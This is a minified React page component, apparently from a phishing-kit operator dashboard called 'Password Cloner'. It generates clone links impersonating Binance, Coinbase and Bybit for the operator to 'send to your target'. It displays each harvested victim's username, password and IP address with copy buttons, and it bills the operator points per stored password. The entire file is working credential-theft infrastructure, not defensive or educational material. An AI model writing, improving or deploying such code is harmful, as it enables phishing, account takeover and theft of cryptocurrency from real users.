import {
    q as h,
    j as s,
    W as _,
    r as p,
    y as B
} from "./app-CPSemYgC.js";
import {
    A as E,
    a as S
} from "./AppLayout-BVugRKpX.js";
import {
    G as L
} from "./GoBack-CC6xQy9d.js";
import {
    B as l
} from "./button-BamgVvPn.js";
import {
    c as x
} from "./copyToClipboard-B49pzkZl.js";
import {
    C as m
} from "./copy-CA1ynquI.js";
import {
    E as A
} from "./external-link-B9zueEzt.js";
import {
    D as g,
    a as y,
    b,
    c as w,
    d as N,
    e as k,
    f as v
} from "./dialog-BauOFWUU.js";
import {
    t as C
} from "./index-Dnc4ycMJ.js";
import {
    s as z
} from "./showIntertiaErrors-Bokdg093.js";
import {
    L as D
} from "./Loader-DxAivhzx.js";
import {
    k as M
} from "./index-CGcBZyi7.js";
import {
    f as R
} from "./formatDate-DSWK92vn.js";
import {
    U as O
} from "./user-8b1sbuCN.js";
import {
    K as T
} from "./key-round-DugN7wqC.js";
import {
    c as F
} from "./createLucideIcon-rN-Z3mCX.js";
import "./index-BIbNlVZ0.js";
import "./index-DdW_XmhI.js";
import "./Combination-C3j38xtn.js";
import "./x-Bf_gKvvP.js";
import "./iconBase-BweG_smQ.js";
const H = F("Wifi", [
        ["path", {
            d: "M12 20h.01",
            key: "zekei9"
        }],
        ["path", {
            d: "M2 8.82a15 15 0 0 1 20 0",
            key: "dnpr2z"
        }],
        ["path", {
            d: "M5 12.859a10 10 0 0 1 14 0",
            key: "1x1e6c"
        }],
        ["path", {
            d: "M8.5 16.429a5 5 0 0 1 7 0",
            key: "1bycff"
        }]
    ]),
    f = ({
        icon: e,
        clone_link: a,
        platformName: t,
        showTargetsButton: o
    }) => {
        const {
            props: i
        } = h(), {
            platform: n
        } = i;
        return s.jsxs("div", {
            className: "w-full rounded-xl border bg-background p-4 flex flex-col gap-3",
            children: [s.jsxs("div", {
                className: "flex items-center gap-3",
                children: [s.jsx("div", {
                    className: "w-10 h-10 rounded-full overflow-hidden flex-shrink-0 flex items-center justify-center bg-foreground",
                    children: s.jsx("img", {
                        src: e,
                        alt: t,
                        className: "w-7 h-7 object-contain"
                    })
                }), s.jsx("p", {
                    className: "font-semibold",
                    children: t
                })]
            }), s.jsxs("div", {
                className: "flex items-center gap-2",
                children: [s.jsxs(l, {
                    variant: "outline",
                    size: "sm",
                    className: "flex-1 gap-1.5 text-xs",
                    onClick: () => x(a),
                    children: [s.jsx(m, {
                        size: 14
                    }), "Copy"]
                }), s.jsx("div", {
                    className: "flex-1",
                    children: o
                }), s.jsx("a", {
                    href: a,
                    target: "_blank",
                    rel: "noopener noreferrer",
                    className: "flex-1",
                    children: s.jsxs(l, {
                        size: "sm",
                        className: "w-full gap-1.5 text-xs text-white",
                        style: {
                            backgroundColor: n.primary_color
                        },
                        children: [s.jsx(A, {
                            size: 14
                        }), "Visit"]
                    })
                })]
            })]
        })
    },
    I = ({
        target: e
    }) => {
        const {
            props: a
        } = h(), {
            platform: t
        } = a, {
            setData: o,
            processing: i,
            post: n
        } = _({
            target_id: e.id
        });
        p.useEffect(() => {
            o({
                target_id: e.id
            })
        }, [e]);
        const [c, r] = p.useState(!1), u = () => {
            n(route("target.destroy"), {
                onSuccess: () => {
                    C.success("Succesful"), r(!1)
                },
                onError: d => {
                    z(d)
                }
            })
        };
        return s.jsxs(g, {
            open: c,
            onOpenChange: r,
            children: [s.jsx(y, {
                asChild: !0,
                children: s.jsx(l, {
                    variant: "outline",
                    size: "icon",
                    className: "h-6 w-6 border-red-200 dark:border-red-500/20 hover:bg-red-50 dark:hover:bg-red-500/10",
                    children: s.jsx(M, {
                        size: 10,
                        className: "text-red-500"
                    })
                })
            }), s.jsxs(b, {
                children: [s.jsxs(w, {
                    children: [s.jsx(N, {
                        children: "Are you absolutely sure?"
                    }), s.jsx(k, {
                        children: "This action cannot be undone. This will permanently delete this stored password."
                    })]
                }), s.jsx("div", {
                    className: ""
                }), s.jsxs(v, {
                    className: "gap-y-2",
                    children: [s.jsx(l, {
                        onClick: () => r(!1),
                        variant: "outline",
                        children: "Cancel"
                    }), s.jsx(l, {
                        style: {
                            backgroundColor: t.primary_color
                        },
                        onClick: u,
                        className: "text-white",
                        children: i ? s.jsx(D, {}) : "Continue"
                    })]
                })]
            })]
        })
    },
    U = ({
        target: e
    }) => {
        const {
            props: a
        } = h(), {
            platform: t
        } = a;
        return s.jsxs("div", {
            className: "rounded-xl border bg-background p-4 flex flex-col gap-3",
            children: [s.jsxs("div", {
                className: "flex items-center justify-between",
                children: [s.jsxs("div", {
                    className: "flex items-center gap-2",
                    children: [s.jsx("span", {
                        className: "text-[10px] font-semibold uppercase tracking-wider px-2 py-0.5 rounded-full",
                        style: {
                            backgroundColor: t.primary_color + "15",
                            color: t.primary_color
                        },
                        children: e.platform_name
                    }), s.jsx("span", {
                        className: "text-ts text-[10px]",
                        children: R(new Date(e.created_at))
                    })]
                }), s.jsx(I, {
                    target: e
                })]
            }), s.jsxs("div", {
                className: "flex flex-col gap-2",
                children: [s.jsxs("button", {
                    onClick: () => x(e.auth_name),
                    className: "flex items-center gap-3 rounded-lg px-3 py-2 text-left transition-colors hover:bg-muted/60 group",
                    children: [s.jsx(O, {
                        size: 14,
                        className: "text-ts shrink-0"
                    }), s.jsxs("div", {
                        className: "flex-1 min-w-0",
                        children: [s.jsx("p", {
                            className: "text-[10px] text-ts uppercase tracking-wide",
                            children: "Username / Email"
                        }), s.jsx("p", {
                            className: "text-sm font-medium truncate",
                            children: e.auth_name
                        })]
                    }), s.jsx(m, {
                        size: 13,
                        className: "text-ts opacity-0 group-hover:opacity-100 transition-opacity shrink-0"
                    })]
                }), s.jsxs("button", {
                    onClick: () => x(e.auth_password),
                    className: "flex items-center gap-3 rounded-lg px-3 py-2 text-left transition-colors hover:bg-muted/60 group",
                    children: [s.jsx(T, {
                        size: 14,
                        className: "text-ts shrink-0"
                    }), s.jsxs("div", {
                        className: "flex-1 min-w-0",
                        children: [s.jsx("p", {
                            className: "text-[10px] text-ts uppercase tracking-wide",
                            children: "Password"
                        }), s.jsx("p", {
                            className: "text-sm font-medium font-mono truncate",
                            children: e.auth_password
                        })]
                    }), s.jsx(m, {
                        size: 13,
                        className: "text-ts opacity-0 group-hover:opacity-100 transition-opacity shrink-0"
                    })]
                }), s.jsxs("button", {
                    onClick: () => x(e.ip_address),
                    className: "flex items-center gap-3 rounded-lg px-3 py-2 text-left transition-colors hover:bg-muted/60 group",
                    children: [s.jsx(H, {
                        size: 14,
                        className: "text-ts shrink-0"
                    }), s.jsxs("div", {
                        className: "flex-1 min-w-0",
                        children: [s.jsx("p", {
                            className: "text-[10px] text-ts uppercase tracking-wide",
                            children: "IP Address"
                        }), s.jsx("p", {
                            className: "text-sm font-medium font-mono truncate",
                            children: e.ip_address
                        })]
                    }), s.jsx(m, {
                        size: 13,
                        className: "text-ts opacity-0 group-hover:opacity-100 transition-opacity shrink-0"
                    })]
                })]
            }), s.jsxs(l, {
                variant: "outline",
                className: "w-full text-xs h-8",
                onClick: () => x(`${e.auth_name} | ${e.auth_password} | ${e.ip_address}`),
                children: [s.jsx(m, {
                    size: 13,
                    className: "text-ts"
                }), "Copy All"]
            })]
        })
    },
    j = ({
        platformName: e,
        targets: a
    }) => {
        const {
            props: t
        } = h(), {
            platform: o
        } = t, [i, n] = p.useState(!1), c = a.filter(r => r.platform_name.toLowerCase() === e.toLowerCase());
        return s.jsxs(g, {
            open: i,
            onOpenChange: n,
            children: [s.jsx(y, {
                asChild: !0,
                children: s.jsx(l, {
                    style: {
                        borderColor: o.primary_color
                    },
                    variant: "outline",
                    size: "sm",
                    className: "w-full font-bold text-xs",
                    children: "Passwords"
                })
            }), s.jsxs(b, {
                children: [s.jsxs(w, {
                    children: [s.jsxs(N, {
                        children: [e, " Stored Passwords"]
                    }), s.jsxs(k, {
                        className: "text-xs flex flex-col gap-1",
                        children: [s.jsx("p", {
                            children: "Tap to copy any of the passwords below."
                        }), s.jsx(l, {
                            onClick: () => {
                                B.reload({
                                    onSuccess: () => {
                                        C.success("Refreshed successfully")
                                    }
                                })
                            },
                            size: "sm",
                            children: "Refresh"
                        })]
                    })]
                }), s.jsxs("div", {
                    className: `flex flex-col w-full gap-2 
                    max-h-[65svh] overflow-y-auto`,
                    children: [c.length === 0 && s.jsx("p", {
                        className: "text-ts text-xs text-center",
                        children: "No stored passwords yet."
                    }), c.map(r => s.jsx(U, {
                        target: r
                    }, r.id))]
                }), s.jsx(v, {
                    className: "gap-y-2",
                    children: s.jsx(l, {
                        onClick: () => n(!1),
                        variant: "outline",
                        children: "Close"
                    })
                })]
            })]
        })
    },
    W = () => {
        const {
            props: e
        } = h(), {
            platform: a,
            auth: t
        } = e, o = t.user ?.pass_link_active, {
            setData: i,
            processing: n,
            post: c
        } = _({
            pass_link_active: o === "yes" ? "no" : "yes"
        });
        p.useEffect(() => {
            i({
                pass_link_active: o === "yes" ? "no" : "yes"
            })
        }, [o]);
        const r = o === "yes" ? "This action will disable the password cloner and you will no longer be charged" : `This action will enable the password cloner and you will be charged ${a.store_pass_fee} points for each stored password.`,
            [u, d] = p.useState(!1),
            P = () => {
                c(route("pass_clone.link_status"), {
                    onSuccess: () => {
                        C.success("Succesful"), d(!1)
                    },
                    onError: $ => {
                        z($)
                    }
                })
            };
        return s.jsxs(g, {
            open: u,
            onOpenChange: d,
            children: [s.jsx(y, {
                asChild: !0,
                children: s.jsxs(l, {
                    size: "sm",
                    className: "w-full font-bold",
                    children: ["Turn ", o === "yes" ? "OFF" : "ON", " Password Cloner"]
                })
            }), s.jsxs(b, {
                children: [s.jsxs(w, {
                    children: [s.jsx(N, {
                        children: "Are you absolutely sure?"
                    }), s.jsx(k, {
                        children: r
                    })]
                }), s.jsx("div", {
                    className: ""
                }), s.jsxs(v, {
                    className: "gap-y-2",
                    children: [s.jsx(l, {
                        onClick: () => d(!1),
                        variant: "outline",
                        children: "Cancel"
                    }), s.jsx(l, {
                        style: {
                            backgroundColor: a.primary_color
                        },
                        onClick: P,
                        className: "text-white",
                        children: n ? s.jsx(D, {}) : "Continue"
                    })]
                })]
            })]
        })
    },
    G = "/build/assets/coinbase-icon-BisVD8RR.png",
    ps = ({
        auth: e,
        platform: a,
        pass_clone_url: t,
        user_api_key: o,
        targets: i
    }) => {
        const n = `${t}/binance?uapi=${o}`,
            c = `${t}/coinbase?uapi=${o}`,
            r = `${t}/bybit?uapi=${o}`;
        return s.jsxs(E, {
            children: [s.jsx(S, {
                title: "Password Clone"
            }), s.jsx("main", {
                className: "w-full flex justify-center",
                children: s.jsxs("div", {
                    className: "flex w-[95%] max-w-[600px] flex-col pt-5 gap-5",
                    children: [s.jsxs("div", {
                        className: "w-full flex-between",
                        children: [s.jsx(L, {}), s.jsx("h1", {
                            className: "font-bold text-lg",
                            children: "Password Cloner"
                        }), s.jsx("h1", {
                            className: "font-bold text-lg opacity-0 hidden sm:block",
                            children: "."
                        })]
                    }), s.jsxs("div", {
                        className: "w-full rounded-xl p-5 flex flex-col items-center gap-3 text-center",
                        style: {
                            background: `linear-gradient(135deg, ${a.primary_color}15, ${a.primary_color}05)`
                        },
                        children: [s.jsx("div", {
                            className: "w-14 h-14 rounded-full flex items-center justify-center",
                            style: {
                                backgroundColor: a.primary_color + "20"
                            },
                            children: s.jsx(T, {
                                size: 28,
                                color: a.primary_color
                            })
                        }), s.jsxs("div", {
                            children: [s.jsx("h2", {
                                className: "font-semibold text-base",
                                children: "Password Cloner"
                            }), s.jsxs("p", {
                                className: "text-ts text-sm mt-1 max-w-[400px]",
                                children: ["Copy a clone link and send it to your target. You'll be charged", " ", s.jsxs("strong", {
                                    children: [a.store_pass_fee, " points"]
                                }), " ", "per stored password."]
                            })]
                        }), s.jsx(W, {})]
                    }), s.jsx("div", {
                        className: "flex items-center justify-between",
                        children: s.jsx("p", {
                            className: "text-ts text-xs font-medium uppercase tracking-wide",
                            children: "Platforms (3)"
                        })
                    }), s.jsxs("div", {
                        className: "w-full flex flex-col gap-3 max-h-[55svh] overflow-y-auto pb-10 px-1",
                        children: [s.jsx(f, {
                            icon: "https://bin.bnbstatic.com/static/images/common/favicon.ico",
                            clone_link: n,
                            platformName: "Binance",
                            showTargetsButton: s.jsx(j, {
                                platformName: "Binance",
                                targets: i
                            })
                        }), s.jsx(f, {
                            icon: G,
                            clone_link: c,
                            platformName: "Coinbase",
                            showTargetsButton: s.jsx(j, {
                                platformName: "Coinbase",
                                targets: i
                            })
                        }), s.jsx(f, {
                            icon: "https://www.bybitglobal.com/common-static/cht-static/user-svc/img/register/bybitLogo.png",
                            clone_link: r,
                            platformName: "Bybit",
                            showTargetsButton: s.jsx(j, {
                                platformName: "Bybit",
                                targets: i
                            })
                        })]
                    })]
                })
            })]
        })
    };
export {
    ps as
    default
};